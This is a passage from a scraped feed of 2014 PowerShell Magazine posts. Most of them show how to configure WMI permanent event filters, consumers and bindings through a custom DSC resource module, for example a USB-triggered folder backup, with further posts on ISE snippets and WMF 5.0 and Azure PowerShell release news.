property.\ncMMAgentOpInsights MMAgentOpInsights { WorkspaceID = 'your-Workspace-ID' WorkspaceKey = 'your-new-Workspace-Key' UpdateWorkspace = $true }  This is it for now. Stay tuned for more updates on this.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/11/26/dsc-resource-module-for-microsoft-monitoring-agent-install-and-configuration-for-azure-operational-insights/","tags":["Azure","PowerShell DSC"],"title":"DSC resource module for Microsoft Monitoring Agent install and configuration of Azure Operational Insights"},{"categories":["WMI","PowerShell DSC"],"contents":"If you have not seen the earlier articles in this series, I had written about:\n DSC resource for managing WMI permanent event filters, consumers, and bindings Troubleshooting WMI standard event consumer issues Using the WMI Commandline Event Consumer DSC resource Using WMI Active Script Event Consumer DSC Resource Using WMI Log File Event Consumer DSC resource Using WMI Event Log Event Consumer DSC resource  In today’s article, I will show you how the WMI SMTP event consumer DSC resource can be used. I will show you how this specific DSC resource is used and then show you a complete configuration script using this resource to send an email every time a removable device is inserted into the system.\nCreating WMI SMTP Event Consumer For obvious reasons, you need to specify the ToLine, FromLine, SMTPServer properties of the DSC resource. The Name property, as you might have guessed by now, uniquely identifies the resource instance. There are several optional properties. The Message property can be used to attach the body of the email and Subject property specifies the email subject. The CCLine and BCCLine properties are self-explained.\nHere is the configuration script that is used to create an SMTP consumer instance.\ncWMISMTPConsumer UFDSMTP { Name = 'UFDSMTP' Message = 'UFD drive with volume name Backup is attached.' Subject = 'UFD Detection' SMTPServer = 'smtp1.mymailserver.com' ToLine = 'ToUser@SomeDomain.com' FromLine = 'FromUser@AnotherDomain.com' Ensure = 'Present' }  Make a note that there is no method to authenticate to the SMTP server. So, if the server you specified in the configuration requires authentication, the consumer action will fail. You can use the method I had explained in an earlier post to detect any failures in consumer actions.\nThe following complete configuration script helps us detect a volume change event and then respond to that using the SMTP event consumer by sending out an email to a specified email address.\nConfiguration BackuptoUFD { Import-DscResource -Module cWMIPermanentEvents cWMIEventFilter UFDDetection { Name = 'UFDFilter' Query = \u0026quot;SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_Volume' AND TargetInstance.Label='Backup'\u0026quot; EventNamespace = 'root\\cimv2' Ensure = 'Present' } cWMISMTPConsumer UFDSMTP { Name = 'UFDSMTP' Message = 'UFD drive with volume name Backup is attached.' Subject = 'UFD Detection' SMTPServer = 'smtp1.mymailserver.com' ToLine = 'ToUser@SomeDomain.com' FromLine = 'FromUser@AnotherDomain.com' Ensure = 'Present' } cWMIEventBinding UFDCommandLineBinding { Filter = 'UFDFilter' Consumer = 'UFDSMTP' ConsumerType = 'SMTP' DependsOn = '[WMIEventFilter]UFDDetection','[WMISMTPConsumer]UFDSMTP' Ensure = 'Present' } } BackuptoUFD  This is the final post in this series of DSC resources for managing WMI permanent event filters, consumers, and bindings. I have a TODO list which I will share as a readme in the Github repo. Feel free to contribute code or report any bugs.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/11/24/using-wmi-smtp-event-consumer-dsc-resource/","tags":["WMI","PowerShell DSC"],"title":"Using WMI SMTP Event Consumer DSC resource"},{"categories":["WMI","PowerShell DSC"],"contents":"If you have not seen the earlier articles in this series, I had written about:\n DSC resource for managing WMI permanent event filters, consumers, and bindings Troubleshooting WMI standard event consumer issues Using the WMI Commandline Event Consumer DSC resource Using WMI Active Script Event Consumer DSC Resource Using WMI Log File Event Consumer DSC resource  In today’s article, I will show you how the WMI Event Log Event Consumer DSC resource can be used. I will show you how this specific DSC resource is used and then show you a complete configuration script using this resource to write an entry in the application event log every time a removable device is inserted into the system.\nCreating WMI NT Event Log Event Consumer The WMI Event Log Consumer DSC resource has only two mandatory properties. The Name property uniquely identifies the consumer instance and the EventID is the numerical ID assigned to identify the event log entry. However, it does not make sense to log an event entry without the message text and event source and so on. The other properties of this DSC resource provide a way to specify this.\nLet us see the configuration script that shows an example of using this DSC resource.\ncWMIEventLogConsumer UFDEventLog { Name = 'UFDEventLog' EventID = 10011 Category = 0 EventType = 'information' SourceName = 'WMI' InsertionStringTemplates = 'A new UFD drive with volume name Backup is found' Ensure = 'Present' }  In this example, we are writing a log entry with an event message text indicating that a new UFD device with volume name “Backup” is attached to the system. The InsertionStringTemplates property is used to specify the message text in the event log entry. This property takes an array of strings. The number of array elements is controlled by the NumberOfInsertionStrings property. By default, this is set to 1 and therefore not shown in the above configuration script. The following complete configuration script shows the event filter, consumer, and the binding that writes an event log entry in response to a Win32_VolumeChangeEvent.\nConfiguration BackuptoUFD { Import-DscResource -Module cWMIPermanentEvents cWMIEventFilter UFDDetection { Name = 'UFDFilter' Query = \u0026quot;SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_Volume' AND TargetInstance.Label='Backup'\u0026quot; EventNamespace = 'root\\cimv2' Ensure = 'Present' } cWMIEventLogConsumer UFDEventLog { Name = 'UFDEventLog' EventID = 10011 Category = 0 EventType = 'information' SourceName = 'WMI' InsertionStringTemplates = 'A new UFD drive with volume name Backup is found' Ensure = 'Present' } cWMIEventBinding UFDCommandLineBinding { Filter = 'UFDFilter' Consumer = 'UFDEventLog' ConsumerType = 'EventLog' DependsOn = '[WMIEventFilter]UFDDetection','[WMIEventLogConsumer]UFDEventLog' Ensure = 'Present' } } BackuptoUFD  This completes the overview of using WMI Event Log consumer DSC resource. In the next article in this series, we will look at the final WMI SMTP standard consumer for sending emails in response to an event.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/11/21/using-wmi-event-log-event-consumer-dsc-resource/","tags":["WMI","PowerShell DSC"],"title":"Using WMI Event Log Event Consumer DSC resource"},{"categories":["WMI","PowerShell DSC"],"contents":"If you have not seen the earlier articles in this series, I had written about:\n DSC resource for managing WMI permanent event filters, consumers, and bindings Troubleshooting WMI standard event consumer issues Using the WMI Commandline Event Consumer DSC resource Using WMI Active Script Event Consumer DSC Resource  In today’s article, I will show you how the WMI Log File Event Consumer DSC resource can be used. I will show you how this specific DSC resource is used and then show you a complete configuration script using this resource to write to a log file every time a removable device is inserted into the system.\nCreating DSC Log File Event Consumer We can write to text log files in response to an event using the Log File Event Consumer. This has three mandatory properties.\nThe FileName property takes the full path to the log file that needs to be created. If the file exists, the contents specified in the Text property will be appended. If the file does not exist, it will be created. The Name property is the unique identity given to the resource instance. In the optional properties, you can use the MaximumFileSize to auto-rotate the log file after a certain size. By default, this is set to 65,535. The final and another optional property is the IsUnicode property. If you want the log file to be encoded in Unicode, you can set it to True.\nThe following configuration script shows how to use this resource.\ncWMILogFileConsumer LogFileConsumer { Name = 'UFDLogFile' Filename = 'C:\\Logs\\Backup.log' Text = 'Removable drive with volume name backup is found. Backup will be initiated.' Ensure = 'Present' } In the above configuration script, we are writing to C:\\Logs\\Backup.log every time we find a removable drive gets inserted with a volume label ‘Backup’.\nComing to the complete configuration script, we have an event filter that triggers every time a removal device with volume name ‘Backup’ is attached to the system, the above configuration script that writes to a log file in response to the event, and an event binding that binds the filter and consumer together.\nConfiguration BackuptoUFD { Import-DscResource -Module cWMIPermanentEvents cWMIEventFilter UFDDetection { Name = 'UFDFilter' Query = \u0026quot;SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_Volume' AND TargetInstance.Label='Backup' AND TargetInstance.DriveType=2\u0026quot; EventNamespace = 'root\\cimv2' Ensure = 'Present' } cWMILogFileConsumer UFDLogFile { Name = 'UFDLogFile' Filename = 'C:\\Logs\\Backup.log' Text = 'Removable drive with volume name backup is found. Backup will be initiated.' Ensure = 'Present' } cWMIEventBinding UFDCommandLineBinding { Filter = 'UFDFilter' Consumer = 'UFDLogFile' ConsumerType = 'LogFile' DependsOn = '[WMIEventFilter]UFDDetection','[WMILogFileConsumer]UFDLogFile' Ensure = 'Present' } } BackuptoUFD  This is it. This brings us to the end of this article. In the next article in this series, we will look at the NT Event Log consumer DSC resource. Stay tuned!\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/11/20/using-wmi-log-file-event-consumer-dsc-resource/","tags":["WMI","PowerShell DSC"],"title":"Using WMI Log File Event Consumer DSC resource"},{"categories":["WMI","PowerShell DSC"],"contents":"In my previous article, I talked about using WMI Commandline Event Consumer DSC resource. In that article, I showed you how we can respond to a flash drive insertion event and create a backup copy of a local folder on the removal device. We already saw how to create an event filter to detect a removable drive insertion event. We will reuse that here. So, let’s directly go the discussion on how we can use the cWMI Active Script Event Consumer DSC resource.\nBefore we go ahead, understand that the only scripting engine supported by the Active Script Event Consumer is VBScript. You cannot invoke PowerShell scripts directly. However, you can use a VBScript wrapper to run a PowerShell script.\nCreating Active Script Consumer The cWMIActiveScriptConsumer DSC resource has two different ways of specifying the script to execute.\nThe first method is to specify a ScriptFileName that takes the complete path to a .vbs script. The second method is to use the ScriptText property to provide the VBScript fragment that needs to be executed. The MaximumQueueSize and ScriptingEngine are optional properties.\ncWMIActiveScriptConsumer UFDScript { Name = 'UFDScript' ScriptText = ' Set objFSO=CreateObject(\"Scripting.FileSystemObject\") curDate = Year(Date) \u0026 \"-\" \u0026 Month(Date) \u0026 \"-\" \u0026 Day(Date) objFolder = TargetEvent.TargetInstance.DriveLetter \u0026 \"\\\" \u0026 curDate Set bkFolder = objFSO.CreateFolder(objFolder) objFSO.CopyFolder \"c:\\Scripts\", objFolder objFile.Close ' Ensure = 'Present' }  In the above configuration script, the TargetEvent.TargetInstance gives us access to the Win32_Volume instance object. Using this, we can retrieve the DriveLetter property for the attached removable disk.\nYou can copy the contents of ScriptText property to a .vbs file and use that as the argument for the ScriptFileName property. Understand that the ScriptText and ScriptFileName are mutually exclusive.\nComplete Configuration Script After the event filter and event consumer instance creation, we need to bind them together. We have already seen an example of using WMIEventBinding DSC resource in an earlier article. So, here is the complete configuration script.\nConfiguration BackuptoUFD { Import-DscResource -Module cWMIPermanentEvents cWMIEventFilter UFDDetection { Name = 'UFDFilter' Query = \"SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_Volume' AND TargetInstance.Label='Backup' AND TargetInstance.DriveType=2\" EventNamespace = 'root\\cimv2' Ensure = 'Present' } cWMIActiveScriptConsumer UFDScript { Name = 'UFDScript' ScriptText = ' Set objFSO=CreateObject(\"Scripting.FileSystemObject\") curDate = Year(Date) \u0026 \"-\" \u0026 Month(Date) \u0026 \"-\" \u0026 Day(Date) objFolder = TargetEvent.TargetInstance.DriveLetter \u0026 \"\\\" \u0026 curDate Set bkFolder = objFSO.CreateFolder(objFolder) objFSO.CopyFolder \"c:\\Scripts\", objFolder objFile.Close ' Ensure = 'Present' } cWMIEventBinding UFDCommandLineBinding { Filter = 'UFDFilter' Consumer = 'UFDScript' ConsumerType = 'Script' DependsOn = '[WMIEventFilter]UFDDetection','[WMIActiveScriptConsumer]UFDScript' Ensure = 'Present' } } BackuptoUFD  This is it for today. In the next article, we will look at how to use the LogFile Event Consumer DSC resource.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/11/19/using-wmi-active-script-event-consumer-dsc-resource/","tags":["WMI","PowerShell DSC"],"title":"Using WMI Active Script Event Consumer DSC resource"},{"categories":["PowerShell DSC","News"],"contents":"If you’ve missed Windows PowerShell team’s announcement, WMF 5.0 Preview November 2014 release is out.\nThis Windows Management Framework (WMF) preview includes everything from WMF 5.0 Preview September 2014 plus some new improvements. You’ll find improvements in:\n OneGet PowerShellGet Windows PowerShell Desired State Configuration Classes for Windows PowerShell Debugging in Windows PowerShell  Changes to Desired State Configuration In addition to the major new features in last WMF 5.0 preview release such as Partial Configurations, class-defined DSC resources, new LCM configuration method, and several new DSC cmdlets, DSC in WMF 5.0 Preview November 2014 release includes the following enhancements.\n32-bit support DSC configurations can now be defined and compiled within a 32-bit process. This means you can use a 32-bit PowerShell host to write configuration on a x64 computer.\nReporting Configuration Status to Central Location You can configuration Local Configuration Manager (LCM) to send the status of the configuration to a central location. This applies to both Push and Pull clients.\nThe GetErrorReport method of the DSC service OData endpoint provides the status of all target systems.\nStart-DscConfiguration supports verbose output after target system restart If a configuration requires a computer restart, Start-DscConfiguration continues streaming information after the target node restarts.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/11/18/dsc-changes-in-windows-management-framework-5-0-preview-november-2014-release/","tags":["PowerShell DSC","News"],"title":"DSC changes in Windows Management Framework 5.0 Preview November 2014 release"},{"categories":["PowerShelll DSC","WMI"],"contents":"In my earlier article, I promised a detailed walk-through of each DSC resource to manage the WMI permanent events. To start that series, I will show how to use the command line Event Consumer DSC resource. The event filter and event binding resources are very straightforward. So, I will talk about these two resources as a part of this article.\nFor the demo purpose, let’s look at something more useful than just monitoring process creation or deletion. In this article, we will see an event filter that detects insertion of a USB flash drive and then triggers the command line Event Consumer to perform backup of a local folder to the newly inserted USB flash drive. Also, I want the backup to be performed only when the flash drive’s volume label is ‘Backup’.\nCreating an Event Filter For detecting a USB flash drive insertion, we can use the Win32_VolumeChangeEvent class. The EventType property tells us what type of volume change event occurred. However, the event object does not contain a volume label. So, instead of this event class, I will use an intrinsic event class named __InstanceCreationEvent and watch for any new Win32_Volume instances. Using this, I get the ability to filter the event based on the label of the inserted flash drive. In the below query, we use DriveType=2 to ensure that we detect only removable disks.\n$Query = \"SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_Volume' AND TargetInstance.Label='Backup' AND TargetInstance.DriveType=2\"  Now that we have the query, let’s see how an event filter can be created using the cWMIEventFilter DSC resource. You can get the syntax for this resource by using the -Syntax parameter with the Get-DscResource cmdlet.\nAs you see here, there are only two mandatory properties–Name and Query. The Name property must be unique on the target system. The Query property takes a WMI query, like the one I showed above, as input. The EventNamespace is set to root\\cimv2, by default. You can set it based on where the event gets triggered. The event filter instance gets created in the root\\subscription namespace.\nThe following code snippet shows the configuration script for a resource instance:\ncWMIEventFilter UFDDetection { Name = 'UFDFilter' Query = \"SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_Volume' AND TargetInstance.Label='Backup' AND TargetInstance.DriveType=2\" EventNamespace = 'root\\cimv2' Ensure = 'Present' }  Creating an instance of Commandline Consumer We have an instance of the event filter created for the USB flash drive insertion. What we need next is a standard consumer instance that performs the action we need. In this article, we will look at the cWMICommandLineConsumer.\nThe Name and the CommandLineTemplate properties are the mandatory in the Commandline Consumer DSC resource. If you specify the program name to execute as part of the CommandLineTemplate property, you should avoid specifying that as the ExecutablePath property and vice versa. Before we create the event consumer instance using DSC, we need a batch command file that copies the data to the newly inserted USB flash drive. We will put a simple xcopy command in a .cmd file and store it in C:\\Scripts folder.\n@ECHO OFF FOR /f %%a in ('WMIC OS GET LocalDateTime ^| find \".\"') DO set DTS=%%a set TODAY=%DTS:~0,4%-%DTS:~4,2%-%DTS:~6,2% Set BackupFolder=%1\\%TODAY% mkdir %BackupFolder% xcopy /E /Y C:\\DSCDemo\\*.* %BackupFolder%  If you see the above batch file, I am creating a folder at the destination to represent a date when the backup was taken. Also, I had hard-coded the folder that needs to be copied. C:\\DSCDemo is the folder that I will be copying to. If you are wondering how the batch script knows which drive letter to use for the newly inserted removable disk, that will be sent to the batch script as a commandline argument. The %1 in the batch script represents the first argument sent to the script.\nWith this handy, let us create the Commandline Consumer instance using DSC.\ncWMICommandLineConsumer UFDCommandLine { Name = 'UFDCommandLineConsumer' CommandLineTemplate = 'cmd.exe /c C:\\Scripts\\Backup.cmd %TargetInstance.DriveLetter%' Ensure = 'Present' }  In the configuration script, if you look at the CommandLineTemplate property, I am passing the drive letter of the removable disk as %TargetInstance.DriveLetter%.\nCreating a Filter to Consumer Binding The binding between the event filter and consumer can be created using c_WMIEventBinding_ DSC resource.\nThis resource takes three mandatory properties. These are Filter, Consumer, and ConsumerType. For the Filter and Consumer properties, you should use the name of the instance you specified in the configuration. In my configuration, it will be UFDFilter and UFDCommandLineConsumer. For the ConsumerType property, the valid values are listed in the screenshot above. For this example, we will need to specify CommandLine as the argument for the ConsumerType property. Here is how the configuration script looks:\ncWMIEventBinding UFDCommandLineBinding { Filter = 'UFDFilter' Consumer = 'UFDCommandLineConsumer' ConsumerType = 'CommandLine' DependsOn = '[WMIEventFilter]UFDDetection','[WMICommandLineConsumer]UFDCommandLineConsumer' Ensure = 'Present' } Now that we have the configuration script for all three, it is time to see the complete configuration script for a target system.\nConfiguration BackuptoUFD { Import-DscResource -Module cWMIPermanentEvents cWMIEventFilter UFDDetection { Name = 'UFDFilter' Query = \u0026quot;SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_Volume' AND TargetInstance.Label='Backup' AND TargetInstance.DriveType=2\u0026quot; EventNamespace = 'root\\cimv2' Ensure = 'Present' } cWMICommandLineConsumer UFDCommandLine { Name = 'UFDCommandLineConsumer' CommandLineTemplate = 'cmd.exe /c C:\\Scripts\\Backup.cmd %TargetInstance.DriveLetter%' Ensure = 'Present' } cWMIEventBinding UFDCommandLineBinding { Filter = 'UFDFilter' Consumer = 'UFDCommandLineConsumer' ConsumerType = 'CommandLine' DependsOn = '[WMIEventFilter]UFDDetection','[WMICommandLineConsumer]UFDCommandLine' Ensure = 'Present' } } I have not used Node block in the configuration script and therefore this generates the configuration MOF for the local system. After we enact this configuration, every time a removable disk with ‘Backup’ volume name is inserted, the backup.cmd script gets triggered and copies contents of C:\\DSCDemo to the removable disk.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/11/18/using-the-wmi-commandline-event-consumer-dsc-resource/","tags":["WMI","PowerShell DSC"],"title":"Using the WMI Commandline Event Consumer DSC resource"},{"categories":["PowerShell DSC"],"contents":"When I am working with Windows PowerShell, PowerShell ISE is my second home. I prefer to do everything within PowerShell ISE and not move away from it to other tools. If you have followed my recent posts, I’ve released a custom DSC module for managing WMI permanent event filters, consumers, and bindings. While experimenting with this module, I had created multiple instances of these WMI objects. There were different ways to delete these objects. Trevor had created a WMIEventHelper utility and Boe converted that it into a WPF UI. I could, of course, delete these objects using PowerShell itself. However, none of this was really integrated into the PowerShell ISE UI.\nThis is what today’s post is about. I’ve created an PowerShell ISE add-on for deleting the filters, consumers, and bindings I’d created using my DSC resource module.\nThe source code for this PowerShell ISE add-on is available on Github and you can compile it using Visual Studio (Community Edition?) 🙂\nOnce you compile the DLL, you can load it using the Add-Type cmdlet and then add it to the vertical add-ons in ISE.\nAdd-Type -Path 'C:\\Script\\PSMag.dll' $psISE.CurrentPowerShellTab.VerticalAddOnTools.Add('Events',[PSMag.WMIEventsAddon],$true)  I have only included the delete functionality in this initial release. While it is not tough to provide create functionality, it is low on my priority list at this moment. Since I will be using only the DSC resource module to create these WMI objects, I am exploring the ability to generate a DSC configuration script for each of the instances instead of using WMI directly.\nThe next update will have exploring instance details by double-clicking any of the instances. Stay tuned.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/11/17/powershell-ise-add-on-to-manage-wmi-permanent-event-filters-consumers-and-bindings/","tags":["PowerShell DSC"],"title":"PowerShell ISE add-on to manage WMI permanent event filters, consumers, and bindings"},{"categories":["WMI"],"contents":"While testing the DSC resource module I created for managing the WMI permanent event filters, consumers, and bindings, I came across a bunch of issues around the consumers not doing the expected job. While there are different reasons why these consumers might fail, the way I could troubleshoot those issues is more important.\nTo give you an idea about WMI permanent event subscriptions, it involves three basic steps. First one is creating an event filter that specifies the type and characteristics of event to monitor. The second step is to determine the right consumer for the type of action that needs to be performed. There are five standard WMI consumers out of the box. And, the final step is to bind the event filter and the chosen consumer instance together.\nBefore we go into the details, let us take a brief look at the standard consumers.\nThe following table lists the standard consumers. Source: \u0026lt;http://msdn.microsoft.com/en-us/library/aa392395(v=vs.85).aspx\n   Standard consumer Description     ActiveScriptEventConsumer Executes a script when it receives an event notification. For more information, see Running a Script Based on an Event.   LogFileEventConsumer Writes customized strings to a text log file when it receives an event notification. For more information, see Writing to a Log File Based on an Event.   NTEventLogEventConsumer Logs a specific message to the Application event log. For more information, see Logging to NT Event Log Based on an Event.   SMTPEventConsumer Sends an email message by using SMTP each time an event is delivered to it. For more information, see Sending Email Based on an Event.   CommandLineEventConsumer Launches a process when an event is delivered to a local system. The executable file must be in a secure location, or secured with a strong access control list (ACL) to prevent an unauthorized user from replacing your executable with a different executable. For more information, see Running a Program from the Command Line Based on an Event.    The third and final step I mentioned above is essential and without this, the chosen consumer instance will never be used for the configured event filter.\nNow, with the DSC resource module I published, achieving the three steps I mentioned above is very easy. In fact, if there is an issue creating one of these instances (filter, consumer, and binding), you will see it right away. However, the actual functionality of the binding cannot be seen until the event really triggers and a consumer bound to that event filter tries to get into action. So, how do you troubleshoot issues with the consumer that is not working as expected?\nThe WMI infrastructure provides a way to do this. When a consumer fails, WMI creates an instance of __ConsumerFailureEvent which contains the ErrorCode, ErrorDescription, and ErrorObject properties. So, if we subscribe to this event class, we can gather the details around a consumer failure through this.\nFor the demonstration purpose, I will use the SMTP consumer to send an email whenever a new process gets created. But, before that, I will create a temporary event registration for the __ConsumerFailureEvent class. This is available in all WMI namespaces but since the consumers are created in the root\\subscription namespace, we will use the same for this event class.\nRegister-CimIndicationEvent -Namespace root/subscription -ClassName __ConsumerFailureEvent -Action { $Global:FailedEvent = $Event } | Out-Null With the above temporary event registration, whenever a consumer fails, we get that instance into the $FailedEvent variable in the global scope that can be further examined. For the consumer part, like I mentioned, I will use SMTP consumer and bind it to a process creation event. Here is the DSC configuration script for that. You will need the custom DSC resources I published on Github.\nConfiguration PermEventDemo3 { Import-DscResource -Module cWMIPermanentEvents Node Localhost { cWMIEventFilter ProcessEventFilter { Name = 'ProcessEventFilter' Query = \u0026quot;SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'\u0026quot; Ensure = 'Present' } cWMISMTPConsumer ProcessSMTPConsumer { Name = 'ProcessSMTP' Message = 'New Process Created with name %TargetInstance.Name%' Subject = 'New Process Created' SMTPServer = 'smtp.google.com' ToLine = 'ToUser@SomeDomain.com' FromLine = 'FromUser@AnotherDomain.com' Ensure = 'Present' } cWMIEventBinding ProcessEventLogBinder { Filter = 'ProcessEventFilter' Consumer = 'ProcessSMTP' Ensure = 'Present' ConsumerType = 'SMTP' DependsOn = '[WMIEventFilter]ProcessEventFilter','[WMISMTPConsumer]ProcessSMTPConsumer' } } } PermEventDemo3 In the above configuration, I created an event filter for any process creation, SMTP consumer instance for sending an email to a specific address and specified the relevant properties such as SMTP server address and so on. After that, the event binding DSC resource is used to bind these two together. The SMTP server I specified in the configuration does not exist (the right one is smtp.gmail.com). So, it is expected to fail.\nLet us see what the __ConsumerFailureEvent tells us once it gets triggered.\nWe see that the ErrorObject property is available and has an instance of __ExtendedStatus. We also see that the IntendedConsumer property is set to an instance of the configured SMTP consumer class. So, accessing ErrorObject property should tell us more.\nThis is it. There is no such host called smtp.google.com and we see the correct reason in the error object. This method can be used for any consumer that fails.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/11/13/troubleshooting-wmi-standard-event-consumer-issues/","tags":["WMI"],"title":"Troubleshooting WMI standard event consumer issues"},{"categories":["PowerShell DSC","WMI"],"contents":"I use WMI/CIM event functionality often in my orchestration scripts and WMI permanent events play a big role there. You can learn more about WMI permanent events by reading my book on WMI Query Language. Fellow PowerShell MVP, Trevor Sullivan, created a PowerShell module called PowerEvents that can be used to create permanent WMI filters, consumers, and bind them together. You can use that as well if DSC is not your cup of coffee.\nBut, being a DSC fanatic, I want to always manage my system configuration using DSC. So, I ended up creating a DSC resource module for managing WMI event filters, standard consumers, and bindings between them. This module supports all five standard WMI consumers – Script, Commandline, SMTP, Log File, and Event Log.\nYou can grab this module from my Github repo at https://github.com/rchaganti/DSCResources.\nI have created seven DSC resources for managing WMI permanent event subscriptions.\n WMIEventFilter WMIEventBinding WMIActiveScriptConsumer WMICommandLineConsumer WMIEventLogConsumer WMILogFileConsumer WMISMTPConsumer     DSC resource Name Description     WMIEventFilter Creates an Event filter on the target system   WMIEventBinding Creates a binding between Event filter and Event consumer   WMIActiveScriptConsumer Creates an instance of script event consumer that can be used to trigger VBScript files or script fragments in response to an event   WMICommandLineConsumer Creates an instance of commandline consumer that can be used to execute a commandline application in response to an event   WMIEventLogConsumer Creates an instance of NTEventLog consumer that can be used to log event entries in the application log in response to an event   WMILogFileConsumer Creates an instance of LogFile consumer that can be used to write messages to a text-based log file in response to an event   WMISMTPConsumer Creates an instance of SMTP consumer that can be used to send emails in response to an event    While it is possible to combine all consumers into a single resource, I chose to separate them for ease of authoring as well as usage. The Event Filter and Event Binding do not provide any functionality on their own. They have to be always used along with a standard consumer. The following example shows a basic example of using one of the standard consumer DSC resource with an event filter and binding.\nConfiguration PermEventDemo2 { Import-DscResource -Module cWMIPermanentEvents Node Localhost { cWMIEventFilter ProcessEventFilter { Name = 'ProcessEventFilter' Query = \u0026quot;SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'\u0026quot; Ensure = 'Present' } cWMIEventLogConsumer ProcessEventLog { Name = 'ProcessEventLog' EventID = 10011 Category = 0 EventType = 'Error' SourceName = 'WSH' InsertionStringTemplates = 'New Process Created: %TargetInstance.Name%' Ensure = 'Present' } cWMIEventBinding ProcessEventLogBinder { Filter = 'ProcessEventFilter' Consumer = 'ProcessEventLog' Ensure = 'Present' ConsumerType = 'EventLog' DependsOn = '[WMIEventFilter]ProcessEventFilter','[WMIEventLogConsumer]ProcessEventLog' } } } PermEventDemo2 As you see, using a declarative way to specify the configuration is much easier and clearer. Go ahead and explore the module. This is still work in progress and I will add localization support and help content very soon.\nI will also write detailed examples and walk-throughs for each resource in this module in the upcoming posts.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/11/12/dsc-resource-for-managing-wmi-permanent-event-filters-consumers-and-bindings/","tags":["PowerShell DSC","WMI"],"title":"DSC resource for managing WMI permanent event filters, consumers, and bindings"},{"categories":["PowerShell DSC"],"contents":"PowerShell ISE 4.0 includes a couple of snippets for DSC including the DSC Resource Provider (Simple). This, in fact, is too simple.\nIt lacks output type for Get and Test functions and also the most frequently used Ensure property in the function definition. I decided to create my own snippets. I have also added the content for DSC class-defined resources in PowerShell 5.0. Here is the code for creating these snippets:\n$GetTargetResource = @' #TODO - Add the logic for Get-TargetResource #TODO - Always return a hash table from this function #TODO - Remove $Ensure if it is not required function Get-TargetResource { [OutputType([Hashtable])] param ( [Parameter()] [ValidateSet('Present','Absent')] [string] $Ensure = 'Present' ) } '@ $SetTargetResource = @' #TODO - Add the logic for Set-TargetResource #TODO - Do not return any value from this function #TODO - Remove $Ensure if it is not required function Set-TargetResource { param ( [Parameter()] [ValidateSet('Present','Absent')] [string] $Ensure = 'Present' ) } '@ $TestTargetResource = @' #TODO - Add the logic for Test-TargetResource #TODO - Return only Boolean value from this function #TODO - Remove $Ensure if it is not required function Test-TargetResource { [OutputType([boolean])] param ( [parameter()] [ValidateSet('Present','Absent')] [string] $Ensure = 'Present' ) } '@ $DSCClassResource = @' #TODO - Update ClassName with your resource name #TODO - Remove Ensure enum if not required #ToDO - Add the logic required for Get, Set, and Test functions enum Ensure { Absent Present } [DscResource()] class \u0026amp;lt;ClassName\u0026amp;gt; { [Ensure] $Ensure [void] Set() { } [bool] Test() { } [Hashtable] Get() { } } '@ New-IseSnippet -Title 'DSC Get-TargetResource' -Text $GetTargetResource -Description 'Get-TargetResource DSC function template' -Author 'PowerShell Magazine' -Force New-IseSnippet -Title 'DSC Set-TargetResource' -Text $SetTargetResource -Description 'Set-TargetResource DSC function template' -Author 'PowerShell Magazine' -Force New-IseSnippet -Title 'DSC Test-TargetResource' -Text $TestTargetResource -Description 'Test-TargetResource DSC function template' -Author 'PowerShell Magazine' -Force New-IseSnippet -Title 'DSC Class-defined DSC resource (PowerShell 5.0)' -Text $DSCClassResource -Description 'Class-defined DSC resource template' -Author 'PowerShell Magazine' -Force That creates four snippets in ISE:\nA code for these snippets is available as a Gist on Github.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/11/04/ise-snippets-for-dsc-resource-functions/","tags":["PowerShell DSC"],"title":"ISE Snippets for DSC Resource functions"},{"categories":["Azure","News"],"contents":"If you have missed it, Scott Gu announced major set of updates to Azure services. At a high level, these changes include,\n Marketplace: Announcing Azure Marketplace and partnerships with key technology partners Networking: Network Security Groups, Multi-NIC, Forced Tunneling, Source IP Affinity, and much more Batch Computing: Public Preview of the new Azure Batch Computing Service Automation: General Availability of the Azure Automation Service Anti-malware: General Availability of Microsoft Anti-malware for Virtual Machines and Cloud Services Virtual Machines: General Availability of many more VM extensions – PowerShell DSC, Octopus, VS Release Management  This, of course, needs Azure PowerShell Tools update too! Version 0.8.10 of the Azure cmdlets is now available. This includes new cmdlets to manage Data Factory, Batch Computing, Multi-NIC configurations and so on.\n Azure Data Factory cmdlets in AzureResourceManager mode  New-AzureDataFactory New-AzureDataFactoryGateway New-AzureDataFactoryGatewayKey New-AzureDataFactoryHub New-AzureDataFactoryLinkedService New-AzureDataFactoryPipeline New-AzureDataFactoryTable New-AzureDataFactoryEncryptValue Get-AzureDataFactory Get-AzureDataFactoryGateway Get-AzureDataFactoryHub Get-AzureDataFactoryLinkedService Get-AzureDataFactoryPipeline Get-AzureDataFactoryRun Get-AzureDataFactorySlice Get-AzureDataFactoryTable Remove-AzureDataFactory Remove-AzureDataFactoryGateway Remove-AzureDataFactoryHub Remove-AzureDataFactoryLinkedService 